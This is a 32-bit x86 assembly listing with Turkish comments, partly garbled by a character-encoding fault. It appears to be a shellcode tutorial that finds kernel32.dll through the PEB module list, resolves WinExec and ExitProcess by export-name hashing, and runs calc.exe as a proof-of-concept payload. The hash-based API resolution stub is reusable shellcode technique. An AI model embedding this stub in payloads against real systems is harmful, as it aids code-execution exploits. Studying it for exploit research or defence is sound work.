[BITS 32]

kernel32_bul:
xor ecx, ecx
mov esi, [fs:0x30] ; PEB adresi
mov esi, [esi + 0x0c] ; PEB LOADER DATA adresi
mov esi, [esi + 0x1c] ; Baþlatýlma sýrasýna göre modül listesinin baþlangýç adresi

bir_sonraki_modul:
mov ebx, [esi + 0x08] ; Modülün baz adresi
mov edi, [esi + 0x20] ; Modül adý(unicode formatýnda)
mov esi, [esi] ; esi = Modül listesinde bir sonraki modül meta datalarýnýn bulunduðu adres InInitOrder[X].flink(sonraki modul)
cmp [edi + 12*2], cl ; KERNEL32.DLL 12 karakterden oluþtuðu için 24. byte ýn null olup olmadýðýný kontrol ediyoruz.Bu yöntem olabilecek en güvenli ve jenerik yöntem deðil, ancak iþimizi görüyor.
jne bir_sonraki_modul ; Eðer 24. byte null deðilse kernel32.dll ismini bulamamýþýz demektir

push ebx ;Kernel32nin adresini stacke yaz
push 0x10121ee3 ;WinExec fonksiyon adýnýn hashi
call fonksiyon_bul ;eax ile WinExec fonksiyonunun adresini döndürür
add esp, 4
pop ebx ; Kernel32nin adresini tekrar ebx e yükle
push 0 ;calc metninin sonuna null karakter yerleþtirmek için stacke 0x00000000 yazýyoruz
push 0x636C6163 ;calc metnini little endian formata uydurmak için tersten yazýyoruz
mov ecx, esp ; calc metninin adresini ecx e yükle
push 0 ; WinExec birinci parametre
push ecx ; WinExec ikinci parametre
call eax ; WinExec fonksiyonu çaðrýlýr
push ebx ; Kernel32nin adresini stacke yaz
push 0x3c3f99f8 ;ExitProcess fonksiyon adýnýn hashi
call fonksiyon_bul ;eax ile WinExec fonksiyonunun adresini döndürür
push 0
call eax ;ExitProcess fonksiyonu çaðrýlýr

; Fonksiyon: Fonksiyon hashlerini karþýlaþtýrarak fonksiyon adresini bulmak için.
; esp+8 de modül adresini, esp+4 te fonksiyon hashini alýr
; Fonksiyon adresini eax ile döndürür
fonksiyon_bul:
mov ebp, [esp + 0x08] ;Modül adresini al
mov eax, [ebp + 0x3c] ;MSDOS baþlýðýný atlýyoruz
mov edx, [ebp + eax + 0x78] ;Export tablosunun RVA adresini edx e yazýyoruz
add edx, ebp ;Export tablosunun VA adresini hesaplýyoruz
mov ecx, [edx + 0x18] ;Export tablosundan toplam fonksiyon sayýsýný sayaç olarak kullanmak üzere kaydediyoruz
mov ebx, [edx + 0x20] ;Export names tablosunun RVA adresini ebx e yazýyoruz
add ebx, ebp ;Export names tablosunun VA adresini hesaplýyoruz

fonksiyon_bulma_dongusu:
dec ecx ;Sayaç son fonksiyondan baþlayarak baþa doðru azaltýlýr
mov esi, [ebx + ecx * 4] ;Export names tablosunda sýrasý gelen fonksiyon adýnýn pointerýnýn VA adresini hesaplýyoruz ve pointer ý ESI a atýyoruz (pointer RVA formatýnda)
add esi, ebp ;Fonksiyon pointerýnýn VA adresini hesaplýyoruz

hash_hesapla:
xor edi, edi
xor eax, eax
cld ;lods instructioný ESI register ýný yanlýþlýkla aþaðý yönde deðiþtirmesin diye emin olmak için kullanýyoruz

hash_hesaplama_dongusu:
lodsb ;ESI nin iþaret ettiði mevcut fonksiyon adý harfini (yani bir byteý) AL registerýna yüklüyoruz ve ESI yi bir artýrýyoruz
test al, al ;Fonksiyon adýnýn sonuna gelip gelmediðimizi test ediyoruz
jz hash_hesaplandi ;AL register deðeri 0 ise, yani fonksiyon adýný tamamlamýþsak hesaplamayý sona erdiriyoruz
ror edi, 0xf ;Hash deðerini 15 bit saða rotate ettiriyoruz
add edi, eax ;Hash deðerine mevcut karakteri ekliyoruz
jmp hash_hesaplama_dongusu

hash_hesaplandi:

hash_karsilastirma:
cmp edi, [esp + 0x04] ;Hesaplanan hash deðerinin stackte parametre olarak verilen fonksiyon hash deðeri ile tutup tutmadýðýný kontrol ediyoruz
jnz fonksiyon_bulma_dongusu
mov ebx, [edx + 0x24] ;Fonksiyonun adresini bulabilmek için Export ordinals tablosunun RVA adresini tespit ediyoruz
add ebx, ebp ;Export ordinals tablosunun VA adresini hesaplýyoruz
mov cx, [ebx + 2 * ecx] ;Fonksiyonun Ordinal numarasýný elde ediyoruz (ordinal numarasý 2 byte)
mov ebx, [edx + 0x1c] ;Export adres tablosunun RVA adresini tespit ediyoruz
add ebx, ebp ;Export adres tablosunun VA adresini hesaplýyoruz
mov eax, [ebx + 4 * ecx] ;Fonksiyonun ordinal numarasýný kullanarak fonksiyon adresinin RVA adresini tespit ediyoruz
add eax, ebp ;Fonksiyonun VA adresini hesaplýyoruz

fonksiyon_bulundu:
ret